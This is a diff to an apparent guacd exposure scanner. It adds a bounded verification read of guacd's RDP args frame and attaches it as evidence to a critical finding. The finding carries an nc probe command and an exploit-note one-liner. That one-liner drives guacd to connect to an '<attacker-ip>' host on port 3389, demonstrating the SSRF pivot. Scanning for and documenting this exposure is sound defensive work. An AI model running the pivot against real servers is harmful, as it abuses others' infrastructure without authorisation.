@@ -162,6 +162,49 @@ def _one_select(ip: str, port: int, backend: str,
     return elements[0], elements[1:]
 
 
+# T2 promotion — capture the ACTUAL wire args frame guacd returns for
+# `select,rdp`. Single controlled read: one fresh TCP connect, one opcode,
+# one frame, bounded timeout via proxy.scaled. Non-destructive — guacd's
+# args reply is a template of the parameters it will accept, not a state
+# change. The raw text (LENGTH.VALUE,...;) is real server-side evidence:
+# it includes the VERSION_x_y_z token and the exact parameter list the
+# server-side plugin advertises, which is what an SSRF-pivot exploit is
+# built against. Cap the captured bytes to _MAX_LEAK_BYTES so a
+# pathological reply cannot bloat the finding.
+_MAX_LEAK_BYTES = 4096
+_LEAK_BACKEND = "rdp"
+
+
+def verify_handshake_leak(ip: str, port: int = _DEFAULT_PORT,
+                          timeout: float = _TIMEOUT,
+                          backend: str = _LEAK_BACKEND) -> str:
+    """Single-shot T2 verify: send `select,<backend>` and return the raw
+    wire text of the first args frame back (truncated to _MAX_LEAK_BYTES).
+    Returns '' on any transport failure, non-args opcode, or malformed
+    frame — an empty string means the promotion does not fire and the
+    finding stays at t1."""
+    try:
+        with socket.create_connection((ip, port),
+                                       timeout=proxy.scaled(timeout)) as s:
+            s.sendall(encode("select", backend))
+            frame = _read_frame(s, proxy.scaled(timeout))
+    except OSError:
+        return ""
+    if not frame:
+        return ""
+    try:
+        elements, _rest = decode_one(frame)
+    except ValueError:
+        return ""
+    if not elements or elements[0] != "args":
+        return ""
+    end = frame.find(";")
+    raw = frame[:end + 1] if end >= 0 else frame
+    if len(raw) > _MAX_LEAK_BYTES:
+        raw = raw[:_MAX_LEAK_BYTES]
+    return raw
+
+
 def probe(ip: str, port: int = _DEFAULT_PORT,
           timeout: float = _TIMEOUT,
           backends: tuple[str, ...] = _BACKENDS) -> dict:
@@ -213,11 +256,14 @@ def guacd_targets(hosts: list[Host]) -> list[dict]:
 
 
 def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
-             exploit_note="", depth_tier=""):
-    return {"severity": sev, "title": title, "target": target, "detail": detail,
-            "tool": "nc", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind,
-            "exploit_note": exploit_note, "depth_tier": depth_tier}
+             exploit_note="", depth_tier="", output=""):
+    f = {"severity": sev, "title": title, "target": target, "detail": detail,
+         "tool": "nc", "command": cmd, "remediation": rem,
+         "cwes": cwes, "kind": kind,
+         "exploit_note": exploit_note, "depth_tier": depth_tier}
+    if output:
+        f["output"] = output
+    return f
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -237,6 +283,21 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
             # guacd_exposed — CRITICAL. Any reachable off-loopback guacd is
             # a pre-auth SSRF/pivot: `select,rdp` + attacker-controlled
             # hostname argument reaches anywhere guacd can route.
+            # T2 promotion: if the single-shot `select,rdp` verify captured
+            # the actual args frame guacd volunteered, upgrade depth_tier
+            # to t2 and surface the raw wire text as corroborating server-
+            # side evidence (the RDP plugin's live parameter template plus
+            # its VERSION token — proves the SSRF vector is armed, not just
+            # that the port speaks the protocol).
+            handshake_leak = pr.get("handshake_leak") or ""
+            exposed_tier = "t2" if handshake_leak else "t1"
+            leak_note = ""
+            if handshake_leak:
+                leak_note = (
+                    f" T2 verify captured the live `select,rdp` args frame "
+                    f"({len(handshake_leak)} bytes) — the RDP plugin's "
+                    f"parameter template that an SSRF pivot would be built "
+                    f"against is armed and returned by the server.")
             out.append(_finding(
                 "critical",
                 "guacd reachable off-loopback (no authentication, arbitrary pivot)",
@@ -249,7 +310,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 f"telnet/kubernetes) with any hostname argument and use "
                 f"guacd as an outbound proxy into whatever guacd can route. "
                 f"Backends confirmed built-in: {backends_txt}. "
-                f"Version: {version or 'unknown'}.",
+                f"Version: {version or 'unknown'}." + leak_note,
                 f"printf '6.select,3.vnc;' | nc {h.ip} {p.portid}",
                 "Bind guacd to 127.0.0.1 in /etc/guacamole/guacd.conf "
                 "([server] bind_host = 127.0.0.1). If the web tier lives on "
@@ -265,7 +326,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "8.hostname,15.<attacker-ip>,4.port,4.3389,7.security,"
                     "3.any;\");print(s.recv(4096))'   # watch tcpdump -ni "
                     "any port 3389 on the attacker"),
-                depth_tier="t1"))
+                depth_tier=exposed_tier, output=handshake_leak))
             # Version-gated CVEs. Never emit without a parsed version.
             if _version_lt(version, (1, 2, 0)):
                 out.append(_finding(
@@ -351,6 +412,15 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                 t["reachable"] = pr.get("reachable", False)
                 t["version"] = pr.get("version", "")
                 t["backends"] = len(pr.get("backends_ok", []))
+                # T2 verify — one extra controlled read per reachable guacd
+                # to capture the live `select,rdp` args frame as server-
+                # side evidence. Skipped when the daemon spoke but did not
+                # return an args frame at all (opcode='error'), since the
+                # RDP plugin either isn't loaded or refused.
+                if pr.get("reachable") and pr.get("opcode") == "args":
+                    leak = verify_handshake_leak(t["ip"], t["port"])
+                    if leak:
+                        pr["handshake_leak"] = leak
     fs = findings(hosts, probes)
     runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                  "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
